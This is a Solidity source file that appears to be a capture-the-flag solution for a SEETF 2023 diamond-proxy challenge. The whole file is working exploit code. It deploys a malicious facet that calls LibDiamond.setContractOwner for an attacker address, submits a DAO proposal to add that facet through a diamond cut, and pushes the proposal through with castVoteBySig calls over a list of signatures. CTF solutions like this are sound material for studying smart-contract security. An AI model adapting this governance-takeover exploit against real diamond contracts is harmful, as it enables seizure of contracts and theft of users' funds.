// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {LibDiamond} from "./libraries/LibDiamond.sol";
import "./PigeonDiamond.sol";
import {IDiamondCut} from "./interfaces/IDiamondCut.sol";
import "./facets/DAOFacet.sol";

contract DiamondAttackFacetSEETF23 {
    function attack(address _newOwner) external {
        LibDiamond.setContractOwner(_newOwner);
    }

    fallback() external {}   // init callback
}

contract DiamondAttackSEETF23 {
    PigeonDiamond public diamond;
    DiamondAttackFacetSEETF23 public attackFacet;
    uint public proposalID;

    constructor(address payable target) {
        diamond = PigeonDiamond(target);
        attackFacet = new DiamondAttackFacetSEETF23();
    }

    function submit() external {
        bytes4[] memory attackFacetSelectors = new bytes4[](1);
        attackFacetSelectors[0] = attackFacet.attack.selector;

        IDiamondCut.FacetCut memory cut = IDiamondCut.FacetCut({
            facetAddress: address(attackFacet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: attackFacetSelectors
        });
        proposalID = DAOFacetSEETF23(address(diamond)).submitProposal(address(attackFacet), "", cut);
    }

    function vote(bytes[] memory sigs) external {
        for(uint i = 0; i < sigs.length; i++) {
            DAOFacetSEETF23(address(diamond)).castVoteBySig(proposalID, true, sigs[i]);
        }
    }

}
